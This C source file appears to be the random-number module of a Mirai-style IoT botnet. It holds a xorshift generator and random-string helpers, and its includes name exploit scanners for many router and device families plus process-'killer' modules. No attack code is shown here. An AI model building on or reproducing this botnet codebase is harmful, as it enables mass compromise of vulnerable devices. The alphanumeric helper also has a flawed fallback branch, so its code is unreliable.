#define _GNU_SOURCE

#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#include "headers/checksum.h"
#include "headers/connection.h"
#include "headers/gpon8080_scanner.h"
#include "headers/gpon80_scanner.h"
#include "headers/huawei_scanner.h"
#include "headers/huawei_scannerX.h"
#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/killerX.h"
#include "headers/protocol.h"
#include "headers/rand.h"
#include "headers/realtek_scanner.h"
#include "headers/resolv.h"
#include "headers/scanner.h"
#include "headers/table.h"
#include "headers/thinkphp.h"
#include "headers/util.h"
#include "headers/linksys.h"
#include "headers/zyxel_scanner.h"
#include "headers/adb_scanner.h"
#include "headers/jaws.h"
#include "headers/asus.h"
#include "headers/hnap.h"
#include "headers/comtrend.h"
#include "headers/netlink.h"

static uint32_t x, y, z, w;

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y;
    y = z;
    z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof(uint32_t);
            len -= sizeof(uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof(uint16_t);
            len -= sizeof(uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
    const char alphaset[] = "abcdefghijklmnopqrstuvw012345678";

    while (len > 0)
    {
        if (len >= sizeof(uint32_t))
        {
            int i;
            uint32_t entropy = rand_next();

            for (i = 0; i < sizeof(uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof(uint32_t);
        }
        else
        {
            *str++ = rand_next() % (sizeof(alphaset));
            len--;
        }
    }
}
